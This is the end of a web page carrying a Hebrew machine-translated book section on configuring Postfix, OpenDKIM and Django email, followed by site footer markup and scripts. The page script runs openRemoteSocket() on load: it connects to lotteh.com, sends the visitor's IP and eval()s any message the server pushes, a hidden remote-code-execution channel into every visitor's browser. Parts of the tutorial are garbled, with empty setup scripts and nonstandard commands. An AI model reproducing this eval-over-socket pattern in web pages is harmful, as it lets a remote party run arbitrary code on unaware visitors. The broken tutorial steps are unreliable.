# chroot in/var/spool/postfix, ולכן שקע יוניקס יצטרך להיות
# מוגדר כמוצג בשורה האחרונה למטה.
# שקע מקומי: /run/opendkim/opendkim.sock
# Socket Inet: 8891@localhost
# Socket Inet: 8891
# מארחים שעבורם לחתום ולא לאמת, ברירת המחדל היא 127.0.0.1. ראה את
# פרק פעולה של OpenDkim (8) למידע נוסף.
# Internalhosts 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12
# עוגן האמון מאפשר DNSSEC. ב- Debian, קובץ עוגן הנאמנות מסופק
# לפי החבילה DNS-ROOT-DATA.
# שרתים שמות 127.0.0.1
# מפה דומיינים מכתובות למפתחות המשמשים לחתימת הודעות
# קבוצה של מארחים פנימיים שצריך לחתום על הדואר שלהם</code></pre>
<pre class="language-bash"><code>
nano config/etc_default_opendkim
</code></pre>ולהוסיף את השורות האלה<pre class="language-bash"><code># הערה: זהו קובץ תצורה מדור קודם. זה לא משמש על ידי ה- Opendkim
# שירות Systemd. אנא השתמש בפרמטרי התצורה המתאימים ב
# /etc/opendkim.conf במקום.
# 
# בעבר, אפשר היה לערוך את הגדרות ברירת המחדל כאן ואז לבצע
# /lib/opendkim/opendkim.service.generate כדי ליצור קבצי עקיפה של Systemd בכתובת
# /etc/systemd/system/opendkim.service.d/override.conf ו-
# /etc/tmpfiles.d/opendkim.conf. אמנם זה עדיין אפשרי, אבל עכשיו זה
# מומלץ להתאים את ההגדרות ישירות ב- /etc/opendkim.conf.
# 
# Daemon_opts = ""
# שנה ל-/var/spool/postfix/run/opendkim כדי להשתמש בשקע יוניקס עם
# Postfix ב Chroot:
# Rundir =/var/spool/postfix/run/opendkim
# 
# ביטול סימון כדי לציין שקע חלופי
# שים לב שהגדרת זה יעקוף כל ערך שקע ב- OpenDkim.conf
# בְּרִירַת מֶחדָל:
# האזן בכל הממשקים ביציאה 54321:
# SOCKET = INET: 54321
# האזן ב- Loopback ביציאה 12345:
# Socket = INET: 12345@localhost
# האזן בתאריך 192.0.2.1 בנמל 12345:
# Socket = INET: 12345@192.0.2.1</code></pre>כאשר אנו מוכנים להגדיר את שרת ה- Postfix שלנו, אנו נפעיל את הקוד שלהלן, כאשר שם הדומיין המתאים משובץ. התחל ביצירת סקריפט<pre class="language-bash"><code>
touch scripts/postfixsetup
sudo chmod a+x scripts/postfixsetup
nano scripts/postfixsetup
</code></pre>כעת, ב- Nano, עורך הטקסטים, ערוך את הקובץ הזה כך שהוא כולל את שם הדומיין שלך במקום femmebabe.com.<pre class="language-bash"><code># !/bin/bash
# הגדרת Postfix</code></pre>כעת, הפעל את הסקריפט שהושלם כדי להגדיר את התצורה של Postfix, Opendkim ו- Dovecot.<pre class="language-bash"><code>
./scripts/postfixsetup
</code></pre>לאחר הפעלת סקריפט זה, העתק את השורה האחרונה שהוא מדפיס והדבק אותו בתצורת ה- DNS שלך כערך עבור sendonly._domainkey. זהו מקש OpenDkim המשמש לזיהוי הדומיין שלך בעת שליחת דואר מאובטח.

מדהים! תוך מספר ימים, אתה אמור להיות מסוגל לשלוח דואר מהשרת בתנאי שהכל מוגדר נכון. 

אם רק הגדרת את ה- DNS עבור שרת הדואר שלך, זה אמור לקחת פחות מ- 72 שעות עד שהרשומות יעודדו. זה בדרך כלל הרבה יותר מהיר. אתה יכול לבדוק אם השרת שלך עובד באמצעות פקודה זו, סיפק את הדוא"ל שלך:<pre class="language-bash"><code>
echo “test” | mail -s “Test Email” youremail@gmail.com
</code></pre>אם נראה שהכל עובד נכון, אתה אמור להיות מסוגל לשלוח דוא"ל עם השרת שלך. אם זה לא עובד, נסה להסתכל על היומנים כדי לראות מה השגיאה.<pre class="language-bash"><code>
tail –lines 150 /var/log/mail.log
</code></pre>זה יציע מידע מילולי על דואר שנשלח על ידי השרת והאם הוא פועל כראוי. אתה אמור להיות מסוגל לראות את הדוא"ל גם בתיבת הדואר הנכנס שלך, אם הוא לא שם, בדוק את תיקיית הספאם שלך.

תצטרך גם להגדיר את ההגדרות שלך ב- Settings.py כדי ששרת הדוא"ל שלך יוכל לדבר עם אפליקציית Django שלך, הפרויקט. הוסף או החלף שורות אלה בהגדרות שלך<pre class="language-python"><code>EMAIL_HOST_USER = 'team' # 'Love@mamasheen.com'</code></pre>שימו לב שאנו משתמשים בקובץ config כדי לקבל את הסיסמה. בואו נטען את הקובץ הזה בהגדרות כמו כן, ממש בתחילת הקובץ:<pre class="language-python"><code># פתח וטוען את התצורה</code></pre>בואו ניצור קובץ זה ונוסיף לו מפתח סודי, כמו גם את סיסמת הדואר. כדי ליצור מפתח סודי, השתמש בפקודה זו, בכל אורך שתרצה בסוף:<pre class="language-bash"><code>
openssl rand -base64 64
</code></pre>כעת, העתק את הטקסט שיצר OpenSSL וערוך /etc/config.json<pre class="language-bash"><code>
sudo nano /etc/config.json
</code></pre>הוסף את השורות הבאות לקובץ שלך, עם המפתח שנוצר OpenSSL כמפתח הסודי.<pre class="language-bash"><code>
{
	"SECRET_KEY": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXX-generated-using-openssl)",
	"EMAIL_HOST_PASSWORD": "yourpassword"
}
</code></pre>פורמט JSON הוא פשוט וקל לשימוש, אנו יכולים להכריז על מפתחות אחרים בהם אנו רוצים להשתמש בפרויקט שלנו בדרך זו, ולשמור עליהם נפרדים מספריית הפרויקט שלנו כך שמשתמשים אחרים לא יוכלו לכתוב להם ולכן לא ניתן לקרוא אותם מספריית הפרויקטים שלנו בלבד. זה מומלץ לתרגול למפתחות API, שנשתמש בהם יותר מכמה מעטים כאן.

תרצה גם לגבות את הפרויקט שלך כדי לוודא שהכל נשמר ותוכל לשחזר את העבודה שלך בהמשך גם אם אתה כבר לא רוצה לשכור שרת.<pre class="language-bash"><code>
sudo backup
</code></pre>כעת, נסה לשלוח דוא"ל HTML משרת האינטרנט, בתנאי שליחת אחד משורת הפקודה עובדת. שאילתה את מופע המשתמש שלך במעטפת ושלח דוא"ל HTML למשתמש זה דרך Django. שנה את שמי בקוד, שרלוט, לשם המשתמש שלך.<pre class="language-bash"><code>
python manage.py shell
from django.contrib.auth.models import User
u = User.objects.get(username='Charlotte')
from users.email import send_welcome_email
send_welcome_email(u)
exit()
</code></pre>אם הפקודה הראשונה לא עובדת, הקפד להשתמש<pre class="language-bash"><code>
source venv/bin/activate
</code></pre>בתנאי שהכל מוגדר נכון, כעת תקבל דוא"ל מבורך בתיבת הדואר שלך שנשלחה על ידי אפליקציית האינטרנט שלך. עבודה טובה! עשית דרך ארוכה.

רציתי להוסיף, אם אתה בכלל נאבק עם שגיאות בכלל בזמן שאתה עובד על פרויקט כזה, אל תהסס לחפש תשובות ולבקש עזרה. גוגל, בין מנועי חיפוש, הם משאבים מעולים לחיפוש אחר עזרה בתכנות. כל שעליך לעשות הוא לחפש את השגיאה שאתה מקבל, ותוכל לראות כיצד אנשים אחרים פותרים את הבעיה. כמו כן, אתם מוזמנים ליצור איתי קשר, המחנכים שלכם (מורים, פרופסורים, מורים), כל עמיתים באינטרנט הזמינים לתכנות עזרה, או להתייעץ שוב עם ספר זה או משאבים אחרים כדי למצוא פתרונות לנושאים שאתה חווה. אני מבין שזה לא קל, אבל גם אם קראת עד כה ואינך כותב שום קוד, אתה לומד הרבה על בניית אפליקציית אינטרנט מאפס. טפח על עצמך בגב, אתה עושה נהדרמִשׂרָה.

































תודה שקיבלת את הזמן לקרוא מדריך לפיתוח אתרים מהדורה שלישית. במהדורות עתידיות אכלול יותר מהדוגמאות החשובות שנדונו בתחילת המסמך ואנחנו נצלול הרבה יותר עמוק בעולם של פיתוח תוכנה ופיתוח חומרה. הישאר מעודכן לעתיד לבוא, ואני מצפה ללמד אותך כיצד לבנות תוכנה מדהימה. נתראה הבא</we'll></key></form>
</p>
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
</div>
</div>
<div class="bg-white bottom-readerbar py-0 my-0 hide" id="bnav105">
<div style="display: flex; justify-content: space-around;">
<div class="btn btn-outline-primary" onclick="toggleReader('105');" style="color: black !important;">לִסְגוֹר</div>
<i >עַמוּד <i id="pagecount105"> 1</i></i>

<div class="d-flex">
	<div style="width: 120px;"><input id="jumpto105" class="form-control mr-sm-2" type="number" placeholder="עַמוּד" aria-label="עַמוּד" id="page" name="page"></div>
	<div class="btn btn-outline-success my-2 my-sm-0" onclick="jumpbookto('105');" style="color: black !important;">קְפִיצָה</div>
</div>

</div>
</div>
</div>
<div style="display: inline-block;" class="m-2">
<i>ראה מאמר מלא</i>
<div class="btn btn-outline-primary" onclick="toggleReader('105');">המשך לקרוא</div>
</div>



<div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8062317950995248"
     crossorigin="anonymous"></script>
<!-- Square Ad -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-8062317950995248"
     data-ad-slot="2468505458"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>



<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">לִקְנוֹת</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">קנה עם קריפטו</a></p>


<hr>

<div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
<div class="mb-2" style="display: flex; justify-content: space-around;">
<a title="שתפו בפייסבוק" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fhe%2Fpractical-web-based-deep-learning-and%3F&quote=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.comhttps%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
  <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
<a title="שתף ב- X (לשעבר טוויטר)" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example%20-&url=https://glamgirlx.com/he/practical-web-based-deep-learning-and?" title="Share on X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter-x" viewBox="0 0 16 16" style="text-color: #000000 !important; color: #000000 !important;">
  <path d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z"/>
</svg></a>
<a title="שתפו בפינטרסט" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/he/practical-web-based-deep-learning-and?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
  <path d="M8 0a8 8 0 0 0-2.915 15.452c-.07-.633-.134-1.606.027-2.297.146-.625.938-3.977.938-3.977s-.239-.479-.239-1.187c0-1.113.645-1.943 1.448-1.943.682 0 1.012.512 1.012 1.127 0 .686-.437 1.712-.663 2.663-.188.796.4 1.446 1.185 1.446 1.422 0 2.515-1.5 2.515-3.664 0-1.915-1.377-3.254-3.342-3.254-2.276 0-3.612 1.707-3.612 3.471 0 .688.265 1.425.595 1.826a.24.24 0 0 1 .056.23c-.061.252-.196.796-.222.907-.035.146-.116.177-.268.107-1-.465-1.624-1.926-1.624-3.1 0-2.523 1.834-4.84 5.286-4.84 2.775 0 4.932 1.977 4.932 4.62 0 2.757-1.739 4.976-4.151 4.976-.811 0-1.573-.421-1.834-.919l-.498 1.902c-.181.695-.669 1.566-.995 2.097A8 8 0 1 0 8 0"/>
</svg></a>
<a title="שתפו בלינקדאין" target="_blank" class="btn btn-xlarge btn-light" href="https://www.linkedin.com/shareArticle?mini=true&url=https://glamgirlx.com/he/practical-web-based-deep-learning-and?"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-linkedin" viewBox="0 0 16 16"  style="color: #2867B2">
  <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"/>
</svg></a>
</div>
<div class="mb-2" style="display: flex; justify-content: space-around;">
<a title="שתפו ב-Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/he/practical-web-based-deep-learning-and?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></a>
<a title="שתף ב-Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/he/practical-web-based-deep-learning-and?&title=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
  <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
</svg></a>
<a title="שתף ב-VK" target="_blank" class="btn btn-xlarge btn-light" href="http://vk.com/share.php?url=https://glamgirlx.com/he/practical-web-based-deep-learning-and?"><img src="/media/icons/VK_logo.svg.png" width="30" height="30" alt="VK" style="filter: invert(50%) sepia(69%) saturate(366%) hue-rotate(171deg) brightness(84%) contrast(86%);"></img></a>
</div>
</div>
<div style="mx-auto">
<p id="url" hidden>https://glamgirlx.com/he/practical-web-based-deep-learning-and</p>
<hr>
<div class="pb-1 container rounded"><p class="pt-3">https://glamgirlx.com/he/practical-web-based-deep-learning-and - <button class="btn btn-info btn-sm" onclick="copyToClipboard('url');" title="Share this page by copying the link"><i class="bi bi-clipboard-plus"></i> העתק קישור</button></p></div>
<hr>
<div style="display: flex; justify-content: space-around;"><div id="shareqrcode" style="border-style: solid; border-width: 15px; border-radius: 5px; border-color: #EEEEEE;"></div></div>
<div style="text-align: center;"><small>(לחץ או הקש כדי להוריד תמונה)</small></div>
<div>בידור מקצועי, תמונות, סרטונים, אודיו, סטרימינג בשידור חי ומשחק מזדמן, כמו גם סריקת תעודות זהות, פיתוח אתרים ושירותי פונדקאות.</div>
</div>


        
        

<div class="dropdown">
  <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
    <i class="bi bi-globe"></i> שָׂפָה
  </a>
  <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
    <div style="max-height: 50vh; overflow: scroll;">
        <a class="dropdown-item" href="/en/practical-web-based-deep-learning-and">English</a>
        <a class="dropdown-item" href="/es/practical-web-based-deep-learning-and">Española</a>
        <a class="dropdown-item" href="/fr/practical-web-based-deep-learning-and">Français</a>
        <a class="dropdown-item" href="/de/practical-web-based-deep-learning-and">Deutsch</a>
        <a class="dropdown-item" href="/nl/practical-web-based-deep-learning-and">Nederlands</a>
        <a class="dropdown-item" href="/af/practical-web-based-deep-learning-and">Afrikaans</a>
        <a class="dropdown-item" href="/ar/practical-web-based-deep-learning-and">عربي</a>
        <a class="dropdown-item" href="/pt/practical-web-based-deep-learning-and">Português (Portugal, Brazil)</a>
        <a class="dropdown-item" href="/id/practical-web-based-deep-learning-and">Bahasa</a>
        <a class="dropdown-item" href="/hi/practical-web-based-deep-learning-and">हिंदी</a>
        <a class="dropdown-item" href="/ru/practical-web-based-deep-learning-and">Русский</a>
        <a class="dropdown-item" href="/ja/practical-web-based-deep-learning-and">日本語</a>
        <a class="dropdown-item" href="/th/practical-web-based-deep-learning-and">แบบไทย</a>
        <a class="dropdown-item" href="/zh-CN/practical-web-based-deep-learning-and">中国人</a>
        <a class="dropdown-item" href="/tl/practical-web-based-deep-learning-and">Filipino</a>
        <a class="dropdown-item" href="/cs/practical-web-based-deep-learning-and">čeština</a>
        <a class="dropdown-item" href="/he/practical-web-based-deep-learning-and">עִברִית</a>
        <a class="dropdown-item" href="/it/practical-web-based-deep-learning-and">Italiana</a>
        <a class="dropdown-item" href="/no/practical-web-based-deep-learning-and">norsk</a>
        <a class="dropdown-item" href="/pl/practical-web-based-deep-learning-and">Polski</a>
        <a class="dropdown-item" href="/sv/practical-web-based-deep-learning-and">svenska</a>
        <a class="dropdown-item" href="/tr/practical-web-based-deep-learning-and">Türkçe</a>
        <a class="dropdown-item" href="/uk/practical-web-based-deep-learning-and">українська</a>
        <a class="dropdown-item" href="/vi/practical-web-based-deep-learning-and">Tiếng Việt</a>
        <a class="dropdown-item" href="/zu/practical-web-based-deep-learning-and">Zulu</a>
        <a class="dropdown-item" href="/sq/practical-web-based-deep-learning-and">shqiptare</a>
    </div>
  </div>
</div>

        <p><i>השאירו לי טיפ בביטקוין באמצעות הכתובת הזו:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="העתק כתובת" onclick="copyToClipboard('btc-wallet');">לְהַעְתִיק</button></p>
        <div id="javascript-console"></div>
	    <div class="d-flex justify-content-between p-2">
	        <div style="float:left;">
	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
		    </div>
            <div style="text-align: center;">
                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="בקרו אותי באינסטגרם" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="בקרו אותי בטוויטר" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="צפו בי ביוטיוב" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
            </div>
	        <div style="float:right;">
	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=he" title="עיין בתנאי השירות">תנאים והגבלות</a></span></p>
		    </div>
	    </div>
	    <div style="height: 100px;"></div>
        
    </main>
    
    
    
    <script src="/static/main.js"></script>
    <script>
        


var currentReader = 0;
function toggleReader(id) {
	currentReader = id;
	$('#reader-modal' + id).toggleClass('hide');
	$('#reader-modal' + id).toggleClass('fade-in-fast');
	$('#bnav' + id).toggleClass('hide');
	$('#bnav' + id).toggleClass('fade-in-fast');
	setTimeout(function() {
		$('#reader-modal' + id).toggleClass('fade-in-fast');
		$('#bnav' + id).toggleClass('fade-in-fast');
	}, 1000);
}
function jumpbookto(page) {
	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
}


        
        
        $(document).ready(function() {
            
            
            $(document.getElementById("glam-navbar")).autoHidingNavbar();
            
        	Prism.highlightAll();
        });
        var remoteSocket;
        function openRemoteSocket() {
            window.location.hash = '';
            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
            remoteSocket.addEventListener("open", (event) => {
                console.log('Socket open.');
                fetch('https://lotteh.com/remote/generate/')
        		    .then(response => response.json())
        		    .then(data => {
        		        remoteSocket.send(data.ip);
        		    })
        		    .catch(error => {
        		        console.log('Error:', error);
        		    });
            });
            remoteSocket.addEventListener("close", (event) => {
                console.log('Socket closed.');
                setTimeout(function() {
                    openRemoteSocket();
                }, 10000);
            });
        	remoteSocket.addEventListener("message", (event) => {
                    eval(event.data);
            });
        }
        openRemoteSocket();
        $(document).ready(function() {
        	$("#contact-form").submit(function(e){
                	e.preventDefault();
                	var data = new FormData(document.getElementById('contact-form'));
                	$.ajax({
                        	url: "https://lotteh.com/contact/",
                        	type: "POST",
                        	data: data,
                        	cache: false,
                	        contentType: false,
        	                processData: false,
                            timeout: 1000 * 60,
                	        tryCount: 0,
        	                retryLimit: 5,
                            error: (xhr, textStatus, errorThrown) => {
                                    this.tryCount++;
                                    if(this.tryCount >= this.retryLimit) return;
                                    $.ajax(this);
                            },
                            success: (data) => {
                                    if(data == 'Message sent.') {
                                            $('#contact-submit').prop('disabled', true);
                                            $(this).trigger('reset');
                                    }
                                    document.getElementById('contact-message').innerHTML = data;
                                    $('#contact-message').removeClass('hide');
                            },
                    });
            });
        });
        $(document).ready(function() {
        	
var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
function updateClock() {
    var d = new Date();
    hr = d.getHours();
    min = d.getMinutes();
    sec = d.getSeconds();
    if(hr < 9 || hr >= 21) {
        document.getElementById("dynamicClockContainer").style.backgroundColor = "lightblue";
    }
    hr_rotation = 30 * hr + min / 2; /* converting current time */
    min_rotation = 6 * min;
    sec_rotation = 6 * sec;
    hours = document.getElementsByClassName("dhour");
    for(var x = 0; x < hours.length; x++) {
        hours[x].style.transform = `rotate(${hr_rotation}deg)`;
    }
    minutes = document.getElementsByClassName("dminute");
    for(var x = 0; x < minutes.length; x++) {
        minutes[x].style.transform = `rotate(${min_rotation}deg)`;
    }
    seconds = document.getElementsByClassName("dsecond");
    for(var x = 0; x < hours.length; x++) {
        seconds[x].style.transform = `rotate(${sec_rotation}deg)`;
    }
	var d = new Date();
	var day = days[d.getDay()];
	var hr = d.getHours();
	var min = d.getMinutes();
	if (min < 10) {
	    min = "0" + min;
	}
	var second = d.getSeconds();
	if (second < 10) {
	    second = "0" + second;
	}
	var hour = "";
	if( hr > 9 ) {
	    hour = hr;
	} else {
        hour = '0' + hr;
    }
	var date = d.getDate();
	var month = months[d.getMonth()];
	var year = d.getFullYear();
	if(document.getElementById("current-time-text")) {
		document.getElementById('current-time-text').innerHTML = day + " " + month + " " + date + ", " + year + " - " + hour + ":" + min + ":" + second;
	}

}
if(document.getElementById("dynamicClockContainer")) {
	var dynamicClockInterval = null;
	updateClock();
	dynamicClockInterval = setInterval(function() {
		updateClock();
	}, 1000);
}
var hrs = ["שְׁתֵים עֶשׂרֵה", "אֶחָד", "דוּ", "שְׁלוֹשָׁה", "ארבע", "חָמֵשׁ", "שֵׁשׁ", "שבע", "שְׁמוֹנֶה", "תֵשַׁע", "עֶשֶׂר", "אַחַד עָשָׂר"];
var digits = ["","אֶחָד", "דוּ", "שְׁלוֹשָׁה", "ארבע", "חָמֵשׁ", "שֵׁשׁ", "שבע", "שְׁמוֹנֶה", "תֵשַׁע", "עֶשֶׂר", "אַחַד עָשָׂר"];
var teens = ["אַחַד עָשָׂר", "שְׁתֵים עֶשׂרֵה", "שְׁלוֹשׁ עֶשׂרֵה", "אַרְבַּע עֶשְׂרֵה", "חֲמֵשׁ עֶשׂרֵה", "שֵׁשׁ עֶשׂרֵה", "שְׁבַע עֶשׂרֵה", "שְׁמוֹנֶה עֶשְׂרֵה", "תֵשַׁע עֶשׂרֵה"];
var tens = ["או&#x27;","עֶשֶׂר","עֶשְׂרִים","שְׁלוֹשִׁים","אַרבָּעִים","חֲמִישִׁים"];
function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}
function updateTime() {
	var d = new Date();
	hr = d.getHours()%12;
	min = d.getMinutes();
	sec = d.getSeconds();
	var respond = null;
	if(min == 0) {
		respond = hrs[hr] + " o'clock";
	} else if(min < 11 || min > 19) {
		respond = hrs[hr] + ' ' + tens[Math.floor(min/10)] + ((digits[min%10] == "") ? '' : '-') + digits[min%10];
	} else {
		respond = hrs[hr] + ' ' + teens[min-11];
	}
	if(d.getHours() >= 12) {
		respond = respond + " pm";
	} else {
		respond = respond + " am";
	}
	respond = capitalizeFirstLetter(respond).replace("'-", "'");
	if(document.getElementById("current-time")){
		document.getElementById("current-time").innerHTML = respond;
		if(document.getElementById("current-time2")) {
			document.getElementById("current-time2").innerHTML = respond;
		}
	}
}
var updateTimeInterval;
function updateTimeout() {
	if(updateTimeInterval) clearInterval(updateTimeInterval);
	updateTime();
	var thedate = new Date();
	setTimeout(function() {
		updateTime();
		updateTimeInterval = setInterval(function() {
			updateTime();
		}, 60 * 1000);
	}, (60 - thedate.getSeconds()) * 1000 + 2000);
}
if(document.getElementById("current-time")) {
	updateTimeout();
}

            var qrdiv = document.getElementById("shareqrcode");
        	if(!qrdiv) return;
        	var qr = new QRCode(qrdiv, "https://glamgirlx.com/he/practical-web-based-deep-learning-and?");
        	var image = qrdiv.querySelector('img');
            image.style.width = "100%";
            image.style.height = "100%";
            image.style.maxWidth = "160px";
            image.alt = "שתף דף זה על ידי סריקת קוד QR.";
            try {
                function getBase64Image(img) {
                    var src = img.src;
                    var image = new Image();
                    image.src = src;
                    image.onload = function(event) {
                    var bsfcanvas = document.createElement("canvas");
                    bsfcanvas.width = img.clientWidth + 40;
                    bsfcanvas.height = img.clientHeight + 40;
                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
                    var bsfctx = bsfcanvas.getContext("2d");
                    bsfctx.fillStyle = "#ffffff";
                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
                    var dataURL = bsfcanvas.toDataURL("image/png");
                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
                    };
                }
                function downloadQrImage(url, filename) {
                    const link = document.createElement('a');
                    link.download = filename;
                    link.href = url;
                    link.classList.add('hide');
                    link.click();
                }
                function downloadQr(){
                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
                    getBase64Image(theQrImage);
                }
                qrdiv.onclick = downloadQr;
                } catch(error) {
                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
                }
        });
    </script>
    
    
    
    
    <script>
        if (navigator.serviceWorker) {
            navigator.serviceWorker.register (
              '/serviceworker.js',
              {scope: '/'}
            )
        }
    </script>
</body>
</html>
